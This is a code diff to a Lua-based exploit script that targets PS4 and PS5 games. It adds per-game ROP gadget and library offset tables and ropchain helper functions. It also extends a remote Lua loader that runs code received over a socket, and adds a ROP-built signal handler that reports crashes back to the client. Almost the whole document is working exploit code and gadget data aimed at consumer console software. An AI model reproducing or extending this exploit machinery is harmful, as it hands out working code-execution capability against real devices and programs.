@@ -1,10 +1,13 @@
 
-PLATFORM = "ps4"  -- ps4 or ps5
+PLATFORM = "ps5"  -- ps4 or ps5
+LOG_TO_KLOG = true
 FW_VERSION = nil
 
-WRITABLE_PATH = "/av_contents/content_tmp/"
-LOG_FILE = WRITABLE_PATH .. "log.txt"
-log_fd = io.open(LOG_FILE, "w")
+if not LOG_TO_KLOG then
+    WRITABLE_PATH = "/av_contents/content_tmp/"
+    LOG_FILE = WRITABLE_PATH .. "log.txt"
+    log_fd = io.open(LOG_FILE, "w")
+end
 
 eboot_base = nil
 libc_base = nil
@@ -14,7 +17,10 @@ games_identification = {
     [0xbb0] = "RaspberryCube",
     [0xb90] = "Aibeya",
     [0x420] = "HamidashiCreative",
-    [0x5d0] = "A",
+    [0x5d0] = "AikagiKimiIsshoniPack",
+    [0x280] = "C",
+    [0x600] = "E",
+    [0xd80] = "F",
 }
 
 gadget_table = {
@@ -33,6 +39,13 @@ gadget_table = {
             ["pop rsi; ret"] = 0xd2810,
             ["pop r8; ret"] = 0xa01,
             ["mov r9, rbx; call [rax + 8]"] = 0x14a9a0,
+            
+            ["mov esp, 0xfb0000bd; ret"] = 0x3963d4,
+            ["mov [rax + 8], rcx; ret"] = 0x135aea,
+            ["mov [rax + 0x28], rdx; ret"] = 0x148b9f,
+            ["mov [rcx + 0xa0], rdi; ret"] = 0xd0bbe,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x116792,
+            ["add rax, r8; ret"] = 0xa893,
 
             ["mov [rdi], rsi; ret"] = 0xd0d7f,
             ["mov [rdi], rax; ret"] = 0x9522b,
@@ -83,6 +96,13 @@ gadget_table = {
             ["pop rsi; ret"] = 0x10ef32,
             ["pop r8; ret"] = 0x9f1,
             ["mov r9, rbx; call [rax + 8]"] = 0x1511ff,
+            
+            ["mov esp, 0xfb0000bd; ret"] = 0x3bca94,
+            ["mov [rax + 8], rcx; ret"] = 0x13c4fa,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14f43f,
+            ["mov [rcx + 0xa0], rdi; ret"] = 0xd753e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11d452,
+            ["add rax, r8; ret"] = 0xa7a3,
 
             ["mov [rdi], rsi; ret"] = 0xd76ff,
             ["mov [rdi], rax; ret"] = 0x994cb,
@@ -93,8 +113,8 @@ gadget_table = {
             ["inc dword [rax]; ret"] = 0x1a82cb,
 
             -- branching specific gadgets
-            ["cmp [rcx], eax; ret"] = 0x44ef72,
-            ["cmp [rax], eax; ret"] = nil,
+            ["cmp [rcx], eax; ret"] = 0x303609,
+            ["cmp [rax], eax; ret"] = 0x44ef72,
             ["sete al; ret"] = 0x55747,
             ["setne al; ret"] = 0x50f,
             ["seta al; ret"] = 0x16dbce,
@@ -135,6 +155,13 @@ gadget_table = {
             ["mov r9, rbx; call [rax + 8]"] = nil,
             ["pop r13 ; pop r14 ; pop r15 ; ret"] = 0x141fc7,
             ["mov r9, r13; call [rax + 8]"] = 0x136970,
+            
+            ["mov esp, 0xfb0000bd; ret"] = 0x3798f4,
+            ["mov [rax + 8], rcx; ret"] = 0x1368da,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14967f,
+            ["mov [rcx + 0xa0], rdi; ret"] = 0xd30ae,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x117882,
+            ["add rax, r8; ret"] = 0x9de0,
 
             ["mov [rdi], rsi; ret"] = 0xd326f,
             ["mov [rdi], rax; ret"] = 0x92c67,
@@ -171,7 +198,7 @@ gadget_table = {
             gettimeofday_import = 0x1179a8, -- syscall wrapper
         }
     },
-    a = {
+    aikagi_kimi_isshoni_pack = {
         gadgets = {    
             ["ret"] = 0x4c,
             ["jmp $"] = nil,
@@ -186,6 +213,13 @@ gadget_table = {
             ["pop rsi; ret"] = 0xd2230,
             ["pop r8; ret"] = 0xa01,
             ["mov r9, rbx; call [rax + 8]"] = 0x14a3c0,
+            
+            ["mov esp, 0xfb0000bd; ret"] = 0x394c54,
+            ["mov [rax + 8], rcx; ret"] = 0x13550a,
+            ["mov [rax + 0x28], rdx; ret"] = 0x1485bf,
+            ["mov [rcx + 0xa0], rdi; ret"] = 0xd05de,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x1161b2,
+            ["add rax, r8; ret"] = 0xa893,
 
             ["mov [rdi], rsi; ret"] = 0xd079f,
             ["mov [rdi], rax; ret"] = 0x94c4b,
@@ -214,12 +248,187 @@ gadget_table = {
             longjmp_import = 0x619388, -- to resolve libc base
         },
         libc_addrofs = {
-            memcpy = 0x4E9d0,
+            memcpy = 0x4e9d0,
             longjmp = 0xb68b0,
             strerror = 0x42e40,
             error = 0x178,
             sceKernelGetModuleInfoFromAddr = 0x1a8,
             gettimeofday_import = 0x11c010, -- syscall wrapper
+        }
+    },
+    -- not supporting new mov r9, consider dropping
+    c = {
+        gadgets = {    
+            ["ret"] = 0x4c,
+            ["jmp $"] = nil,
+
+            ["pop rsp; ret"] = 0x972,
+            ["pop rbp; ret"] = 0x79,
+            ["pop rax; ret"] = 0x962,
+            ["pop rbx; ret"] = 0x3f311,
+            ["pop rcx; ret"] = 0xc35,
+            ["pop rdx; ret"] = 0x3066e2,
+            ["pop rdi; ret"] = 0x107550,
+            ["pop rsi; ret"] = 0xfcd16,
+            ["pop r8; ret"] = 0x961,
+            ["mov r9, rbx; call [rax + 8]"] = 0x145f20,
+            
+            ["mov esp, 0xfb0000bd; ret"] = 0x3925e4,
+            ["mov [rax + 8], rcx; ret"] = 0x12c5ff,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14439f,
+            ["mov [rcx + 0xa0], rdi; ret"] = 0xcbc3e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = nil,
+            ["add rax, r8; ret"] = 0x116d16,
+
+            ["mov [rdi], rsi; ret"] = 0xcbe0f,
+            ["mov [rdi], rax; ret"] = 0xa16b,
+            ["mov [rdi], eax; ret"] = 0xa16c,
+            ["add [rbx], eax; ret"] = 0x405d0b,
+            ["add [rbx], ecx; ret"] = nil,
+            ["add [rbx], edi; ret"] = 0x3e2e53,
+            ["mov rax, [rax]; ret"] = 0x1e55b,
+            ["inc dword [rax]; ret"] = 0x18ecbb,
+
+            -- branching specific gadgets
+            ["cmp [rcx], eax; ret"] = 0x2d2d79,
+            ["cmp [rax], ebx; ret"] = nil,
+            ["sete al; ret"] = 0x55bc5,
+            ["setne al; ret"] = 0x1c58e,
+            ["seta al; ret"] = 0x16187e,
+            ["setb al; ret"] = 0x55be4,
+            ["setg al; ret"] = nil,
+            ["setl al; ret"] = 0xc600a,
+            ["shl rax, cl; ret"] = 0xd0623,
+            ["add rax, rcx; ret"] = 0x102341,
+        },
+        eboot_addrofs = {
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x195280, -- to resolve eboot base
+            longjmp_import = 0x4caf88, -- to resolve libc base
+        },
+        libc_addrofs = {
+            memcpy = 0x54a60,
+            longjmp = 0x71b20,
+            strerror = 0x49020,
+            error = 0x148,
+            sceKernelGetModuleInfoFromAddr = 0x548,
+            gettimeofday_import = 0xdbd60, -- syscall wrapper
+        }
+    },
+    e = {
+        gadgets = {    
+            ["ret"] = 0x4c,
+            ["jmp $"] = nil,
+            
+            ["pop rsp; ret"] = 0x932,
+            ["pop rbp; ret"] = 0x79,
+            ["pop rax; ret"] = 0x922,
+            ["pop rbx; ret"] = 0xd16f5,
+            ["pop rcx; ret"] = 0xc15,
+            ["pop rdx; ret"] = 0x194902,
+            ["pop rdi; ret"] = 0xd74c2,
+            ["pop rsi; ret"] = 0xe4b04,
+            ["pop r8; ret"] = 0x921,
+            ["mov r9, rbx; call [rax + 8]"] = 0x14f760,
+            
+            ["mov esp, 0xfb0000bd; ret"] = 0x3b8784,
+            ["mov [rax + 8], rcx; ret"] = 0x13b120,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14d97f,
+            ["mov [rcx + 0xa0], rdi; ret"] = 0xd575e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11c2c2,
+            ["add rax, r8; ret"] = 0x125b56,
+
+            ["mov [rdi], rsi; ret"] = 0xd592f,
+            ["mov [rdi], rax; ret"] = 0xa42b,
+            ["mov [rdi], eax; ret"] = 0xa42c,
+            ["add [rbx], eax; ret"] = 0x42a0db,
+            ["add [rbx], ecx; ret"] = nil,
+            ["add [rbx], edi; ret"] = 0x408943,
+            ["mov rax, [rax]; ret"] = 0x201cb,
+            ["inc dword [rax]; ret"] = 0x198dbb,
+
+            -- branching specific gadgets
+            ["cmp [rcx], eax; ret"] = 0x2f93a9,
+            ["cmp [rax], eax; ret"] = nil,
+            ["sete al; ret"] = 0x5e635,
+            ["setne al; ret"] = 0x1e39e,
+            ["seta al; ret"] = 0x16af0e,
+            ["setb al; ret"] = 0x5e654,
+            ["setg al; ret"] = nil,
+            ["setl al; ret"] = 0xcfc4a,
+            ["shl rax, cl; ret"] = 0xda391,
+            ["add rax, rcx; ret"] = 0x355ce,
+        },
+        eboot_addrofs = {
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x19f600, -- to resolve eboot base
+            longjmp_import = 0x4f3ac0, -- to resolve libc base
+        },
+        libc_addrofs = {
+            memcpy = 0x18590,
+            longjmp = 0x7f6b0,
+            strerror = 0xcda0,
+            error = 0x138,
+            sceKernelGetModuleInfoFromAddr = 0x568,
+            gettimeofday_import = 0xefd10, -- syscall wrapper
+        }
+    },
+    f = {
+        gadgets = {    
+            ["ret"] = 0x4c,
+            ["jmp $"] = nil,
+            
+            ["pop rsp; ret"] = 0xa02,
+            ["pop rbp; ret"] = 0x79,
+            ["pop rax; ret"] = 0x9f2,
+            ["pop rbx; ret"] = 0x608b6,
+            ["pop rcx; ret"] = 0x14a7f,
+            ["pop rdx; ret"] = 0x3f3ce7,
+            ["pop rdi; ret"] = 0x899fb,
+            ["pop rsi; ret"] = 0x10f122,
+            ["pop r8; ret"] = 0x9f1,
+            ["mov r9, rbx; call [rax + 8]"] = 0x1513ef,
+            
+            ["mov esp, 0xfb0000bd; ret"] = 0x3bd134,
+            ["mov [rax + 8], rcx; ret"] = 0x13c6ea,
+            ["mov [rax + 0x28], rdx; ret"] = 0x14f62f,
+            ["mov [rcx + 0xa0], rdi; ret"] = 0xd772e,
+            ["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"] = 0x11d642,
+            ["add rax, r8; ret"] = 0xa7a3,
+
+            ["mov [rdi], rsi; ret"] = 0xd78ef,
+            ["mov [rdi], rax; ret"] = 0x996bb,
+            ["mov [rdi], eax; ret"] = 0x996bc,
+            ["add [rbx], eax; ret"] = nil,
+            ["add [rbx], ecx; ret"] = 0x44107f,
+            ["add [rbx], edi; ret"] = 0x40cde3,
+            ["mov rax, [rax]; ret"] = 0x2008b,
+            ["inc dword [rax]; ret"] = 0x1a84bb,
+
+            -- branching specific gadgets
+            ["cmp [rcx], eax; ret"] = 0x303ca9,
+            ["cmp [rax], eax; ret"] = 0x44f6fe,
+            ["sete al; ret"] = 0x55787,
+            ["setne al; ret"] = 0x50f,
+            ["seta al; ret"] = 0x16ddbe,
+            ["setb al; ret"] = 0x60934,
+            ["setg al; ret"] = nil,
+            ["setl al; ret"] = 0xd1c5a,
+            ["shl rax, cl; ret"] = 0xdc121,
+            ["add rax, rcx; ret"] = 0x35afe,
+        },
+        eboot_addrofs = {
+            fake_string = 0x600164, -- SCE_RELRO segment, use ptr as size for fake string
+            luaB_auxwrap = 0x1aed80, -- to resolve eboot base
+            longjmp_import = 0x6193e8, -- to resolve libc base
+        },
+        libc_addrofs = {
+            memcpy = 0x4df0,
+            longjmp = 0xb5680,
+            strerror = 0x42540,
+            error = 0x168,
+            sceKernelGetModuleInfoFromAddr = 0x198,
+            gettimeofday_import = 0x204060, -- syscall wrapper
         }
     },
 }
@@ -252,14 +461,20 @@ function prepare_arguments(...)
     return s
 end
 
-function print(...)
-    log_fd:write(prepare_arguments(...) .. "\n")
-    log_fd:flush()
+if not LOG_TO_KLOG then
+    function print(...)
+        log_fd:write(prepare_arguments(...) .. "\n")
+        log_fd:flush()
+    end
 end
 
 function printf(fmt, ...)
-    log_fd:write(string.format(fmt, ...) .. "\n")
-    log_fd:flush()
+    if LOG_TO_KLOG then
+        print(string.format(fmt, ...) .. "\n")
+    else
+        log_fd:write(string.format(fmt, ...) .. "\n")
+        log_fd:flush()
+    end
 end
 
 function file_write(filename, data, mode)
@@ -898,7 +1113,7 @@ function lua.resolve_game(luaB_auxwrap)
         libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
         gadgets = gadget_table.raspberry_cube.gadgets
     elseif games_identification[nibbles] == "Aibeya" then
-        print("[+] Game identified as Aibeya/B")
+        print("[+] Game identified as Aibeya/B/G")
         eboot_addrofs = gadget_table.aibeya.eboot_addrofs
         libc_addrofs = gadget_table.aibeya.libc_addrofs
         gadgets = gadget_table.aibeya.gadgets
@@ -907,11 +1122,26 @@ function lua.resolve_game(luaB_auxwrap)
         eboot_addrofs = gadget_table.hamidashi_creative.eboot_addrofs
         libc_addrofs = gadget_table.hamidashi_creative.libc_addrofs
         gadgets = gadget_table.hamidashi_creative.gadgets
-    elseif games_identification[nibbles] == "A" then
-        print("[+] Game identified as A")
-        eboot_addrofs = gadget_table.a.eboot_addrofs
-        libc_addrofs = gadget_table.a.libc_addrofs
-        gadgets = gadget_table.a.gadgets
+    elseif games_identification[nibbles] == "AikagiKimiIsshoniPack" then
+        print("[+] Game identified as Aikagi Kimi to Issho ni Pack")
+        eboot_addrofs = gadget_table.aikagi_kimi_isshoni_pack.eboot_addrofs
+        libc_addrofs = gadget_table.aikagi_kimi_isshoni_pack.libc_addrofs
+        gadgets = gadget_table.aikagi_kimi_isshoni_pack.gadgets
+    elseif games_identification[nibbles] == "C" then -- TODO: Test
+        print("[+] Game identified as C/D")
+        eboot_addrofs = gadget_table.c.eboot_addrofs
+        libc_addrofs = gadget_table.c.libc_addrofs
+        gadgets = gadget_table.c.gadgets
+    elseif games_identification[nibbles] == "E" then -- TODO: Test
+        print("[+] Game identified as E")
+        eboot_addrofs = gadget_table.e.eboot_addrofs
+        libc_addrofs = gadget_table.e.libc_addrofs
+        gadgets = gadget_table.e.gadgets
+    elseif games_identification[nibbles] == "F" then -- TODO: Test
+        print("[+] Game identified as F")
+        eboot_addrofs = gadget_table.f.eboot_addrofs
+        libc_addrofs = gadget_table.f.libc_addrofs
+        gadgets = gadget_table.f.gadgets
     end
 end
 
@@ -1172,12 +1402,12 @@ ropchain = {}
 ropchain.__index = ropchain
 
 setmetatable(ropchain, {
-    __call = function(_, stack_size, padding)  -- make class callable as constructor
-        return ropchain:new(stack_size, padding)
+    __call = function(_, stack_base, stack_size, padding)  -- make class callable as constructor
+        return ropchain:new(stack_base, stack_size, padding)
     end
 })
 
-function ropchain:new(stack_size, padding)
+function ropchain:new(stack_base, stack_size, padding)
 
     stack_size = stack_size or 0x500
 
@@ -1189,7 +1419,7 @@ function ropchain:new(stack_size, padding)
 
     self.stack_offset = 0
     self.stack_size = stack_size + padding
-    self.stack_base = bump.alloc(self.stack_size) + padding
+    self.stack_base = stack_base or bump.alloc(self.stack_size) + padding
     self.stack_backup = bump.alloc(self.stack_size) + padding
     
     self.jmpbuf_size = 0x50
@@ -1275,7 +1505,8 @@ end
 
 function ropchain.resolve_value(v)
     if type(v) == "string" then
-        v = lua.addrof(v.."\0")+24  -- with null terminator
+        -- v = lua.addrof(v.."\0")+24  -- with null terminator
+        v = lua.addrof(v) + 24
     elseif not (is_uint64(v) or type(v) == "number") then
         errorf("ropchain.resolve_value: invalid type (%s)", type(v))
     end
@@ -1352,6 +1583,15 @@ function ropchain:push_set_r9(v) -- clobber rax, rbx / r13, r14, r15, rax
     end
 end
 
+function ropchain:push_set_r9_wo_call(v) -- clobber rax, rsi, r8
+    temp_addr = bump.alloc(0x8)
+    memory.write_qword(self.recover_from_call, v)
+    self:push_set_rax(self.recover_from_call - 0x18)
+    self:push_set_rsi(0)
+    self:push_set_r8(temp_addr)
+    self:push(gadgets["mov r9, [rax + rsi + 0x18]; xor eax, eax; mov [r8], r9; ret"])
+end
+
 function ropchain:push_load_rax_from_memory(addr)
     self:push_set_rax(addr)
     self:push(gadgets["mov rax, [rax]; ret"])
@@ -1362,9 +1602,42 @@ function ropchain:push_store_eax_into_memory(addr)
     self:push(gadgets["mov [rdi], eax; ret"])
 end
 
+function ropchain:push_store_rax_data_and_add_into_memory(addr, num)
+    self:push(gadgets["mov rax, [rax]; ret"])
+    self:push_add_to_rax(num)
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], rax; ret"])
+end
+
+function ropchain:push_store_rax_data_into_memory(addr)
+    self:push(gadgets["mov rax, [rax]; ret"])
+    self:push_set_rdi(addr)
+    self:push(gadgets["mov [rdi], rax; ret"])
+end
+
 function ropchain:push_store_rax_into_memory(addr)
     self:push_set_rdi(addr)
     self:push(gadgets["mov [rdi], rax; ret"])
+end
+
+function ropchain:push_store_rcx_into_memory(addr) -- clobbers rax
+    self:push_set_rax(addr - 0x8)
+    self:push(gadgets["mov [rax + 8], rcx; ret"])
+end
+
+function ropchain:push_store_rdx_into_memory(addr) -- clobbers rax
+    self:push_set_rax(addr - 0x28)
+    self:push(gadgets["mov [rax + 0x28], rdx; ret"])
+end
+
+function ropchain:push_store_rdi_into_memory(addr) -- clobbers rcx
+    self:push_set_rcx(addr - 0xa0)
+    self:push(gadgets["mov [rcx + 0xa0], rdi; ret"])
+end
+
+function ropchain:push_add_to_rax(num)
+    self:push_set_r8(num)
+    self:push(gadgets["add rax, r8; ret"])
 end
 
 function ropchain:push_add_dword_memory_with_eax(addr)
@@ -1585,6 +1858,7 @@ function ropchain:execute()
 
     self:reset_chain()
     -- print(self) -- uncomment to show finalized ropchain
+    
     return self:execute_rop()
 end
 
@@ -1681,6 +1955,7 @@ function syscall_rop:new(syscall_no)
 
     local self = setmetatable({}, syscall_rop)
     self.syscall_no = syscall_no
+    
     return self
 end
 
@@ -1719,15 +1994,20 @@ function syscall.init()
     elseif PLATFORM == "ps5" then -- can be any syscall wrapper in libkernel
         local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
         syscall_rop.syscall_address = gettimeofday + 7  -- +7 is to skip "mov rax, <num>" instruction
+        WRITE_ADDR = syscall_rop.syscall_address
     else
         errorf("invalid platform %s", PLATFORM)
     end
 end
 
+WRITE_ADDR = nil
 function syscall.resolve(list)
     for name, num in pairs(list) do
         if PLATFORM == "ps4" then
             if syscall.syscall_wrapper[num] then
+                if name == "write" then
+                    WRITE_ADDR = syscall.syscall_wrapper[num]
+                end
                 syscall[name] = function_rop(syscall.syscall_wrapper[num])
             else
                 printf("warning: syscall %s (%d) not found", name, num)
@@ -1741,23 +2021,21 @@ end
 
 
 
--- todo: figure out a way to write to socket directly for realtime output
--- todo: capture memory error and pass to client (sigsegv)
-function run_lua_code(lua_code)
+function run_lua_code(lua_code, client_fd)
 
     local script, err = loadstring(lua_code)
     if not script then
         return "error loading script: " .. err
     end
 
-    local output = {}
-
     local env = {
         print = function(...)
-            table.insert(output, prepare_arguments(...))
+            local out = prepare_arguments(...) .. "\n"
+            syscall.write(client_fd, out, #out)
         end,
         printf = function(fmt, ...)
-            table.insert(output, string.format(fmt, ...))
+            local out = string.format(fmt, ...) .. "\n"
+            syscall.write(client_fd, out, #out)
         end
     }
 
@@ -1771,16 +2049,15 @@ function run_lua_code(lua_code)
 
     -- pass error to client
     if err then
-        table.insert(output, err)
+        syscall.write(client_fd, err, #err)
     end
-
-    return table.concat(output, "\n")
 end
 
 function get_error_string()
     local strerror = function_rop(libc_addrofs.strerror)
-    local error = function_rop(libc_addrofs.error)
-    return memory.read_null_terminated_string(strerror(error()))
+    local error_func = function_rop(libc_addrofs.error)
+    local errno = memory.read_qword(error_func())
+    return errno:tonumber() .. " " .. memory.read_null_terminated_string(strerror(errno))
 end
 
 function remote_lua_loader(port)
@@ -1832,6 +2109,9 @@ function remote_lua_loader(port)
 
     notify(string.format("remote lua loader\nrunning on %s %s\nlistening on port %d",
         PLATFORM, FW_VERSION, port))
+        
+    -- setup signal handler
+    signal_handler()
 
     while true do
 
@@ -1845,6 +2125,8 @@ function remote_lua_loader(port)
  
         syscall.read(client_fd, tmp, 8)
         local size = memory.read_qword(tmp):tonumber()
+        
+        printf("[+] accepted new connection client fd %d", client_fd)
 
         if size > 0 and size < maxsize then            
             
@@ -1853,8 +2135,10 @@ function remote_lua_loader(port)
             
             printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
             
-            local output = run_lua_code(lua_code)
-            syscall.write(client_fd, output, #output)
+            -- write to signal handler
+            signal_handler_rop(client_fd)
+            
+            run_lua_code(lua_code, client_fd)
         else
             local err = string.format("error: lua code exceed maxsize " ..
                 "(given %s maxsize %s)\n", hex(size), hex(maxsize))
@@ -1929,6 +2213,92 @@ function get_version()
     return version
 end
 
+function signal_handler()
+    local SIGILL = 4
+    local SIGBUS = 10
+    local SIGSEGV = 11
+    
+    local signals = {SIGILL, SIGBUS, SIGSEGV}
+    
+    local SA_SIGINFO = 0x4
+    local sigaction_struct = bump.alloc(0x28)
+    
+    memory.write_qword(sigaction_struct, gadgets["mov esp, 0xfb0000bd; ret"]) -- sigaction.sa_handler
+    memory.write_qword(sigaction_struct+0x20, SA_SIGINFO) -- sigaction.sa_flags
+    
+    MAP_PRIVATE = 0x2
+    MAP_FIXED = 0x10
+    MAP_ANONYMOUS = 0x1000
+    MAP_COMBINED = bit32.bor(MAP_PRIVATE, MAP_FIXED, MAP_ANONYMOUS)
+    
+    PROT_READ = 0x1
+    PROT_WRITE = 0x2
+    PROT_COMBINED = bit32.bor(PROT_READ, PROT_WRITE)
+    
+    if syscall.mmap(0xfb000000, 0x1000, PROT_COMBINED, MAP_COMBINED, -1 ,0):tonumber() < 0 then
+        error("mmap() error: " .. get_error_string())
+    end
+    
+    for i,signal in ipairs(signals) do
+        if syscall.sigaction(signal, sigaction_struct, 0):tonumber() < 0 then
+            error("sigaction() error: " .. get_error_string())
+        end
+    end
+    
+end
+
+function signal_handler_rop(client_fd)
+    ucontext_struct = string.rep("\0", 0x8)
+    local ucontext_struct_addr = ropchain.resolve_value(ucontext_struct)
+    local mcontext_offset = 0x40
+    local reg_rbp_offset = 0x48
+    local reg_rsp_offset = 0xb8
+    local output_addr = 0xfb000080
+    
+    -- write error address back to socket
+    local chain = ropchain(0xfb0000bd - 0x8)
+    memory.write_dword(output_addr, 0x13371337) -- write magic value
+    chain:push_store_rdi_into_memory(output_addr + 0x4) -- rdi contains signal code
+    chain:push_store_rax_into_memory(output_addr + 0xc) -- rax contains crashing address
+    chain:push_store_rdx_into_memory(ucontext_struct_addr)
+    
+    chain:push_set_rdi(ropchain.resolve_value(client_fd))
+    chain:push_set_r9_wo_call(0)
+    chain:push_set_rsi(output_addr) -- output
+    chain:push_set_rdx(20) -- output len
+    chain:push_set_r8(0)
+    chain:push_set_rax(4) -- syscall_num=write
+    chain:push_fcall_raw(WRITE_ADDR)
+    
+    -- restore execution by jumping to a new rop chain
+    chain:push_set_rsp(0xfb000200)
+    
+    local rst_chain = ropchain(0xfb000200 - 0x8)
+    
+    -- advance to old rbp
+    rst_chain:push_load_rax_from_memory(ucontext_struct_addr)
+    rst_chain:push_add_to_rax(mcontext_offset + reg_rbp_offset)
+    -- write to rop chain
+    rst_chain:push_store_rax_data_and_add_into_memory(0xfb000360, 0x8) -- write value to push_set_rbp()
+    
+    -- advance to old rsp
+    rst_chain:push_load_rax_from_memory(ucontext_struct_addr)
+    rst_chain:push_add_to_rax(mcontext_offset + reg_rsp_offset)
+    -- write to rop chain
+    rst_chain:push_store_rax_data_and_add_into_memory(0xfb000390, 0x8) -- write value to push_set_rsp()
+    
+    rst_chain:push_set_r9_wo_call(0)
+    rst_chain:push_set_r8(0)
+    rst_chain:push_set_rsi(0)
+    rst_chain:push_set_rdx(0)
+    rst_chain:push_set_rcx(0)
+    rst_chain:push_set_rbx(0)
+    rst_chain:push_set_rbp(0) -- will be changed
+    rst_chain:push_set_rdi(0)
+    rst_chain:push_set_rax(0)
+    rst_chain:push_set_rsp(0) -- will be changed
+end
+
 function main()
 
     -- setup read & limited write primitives
@@ -1958,6 +2328,8 @@ function main()
         setsockopt = 105,
         listen = 106,
         sysctl = 202,
+        sigaction = 416,
+        mmap = 477,
     })
 
     -- sanity check
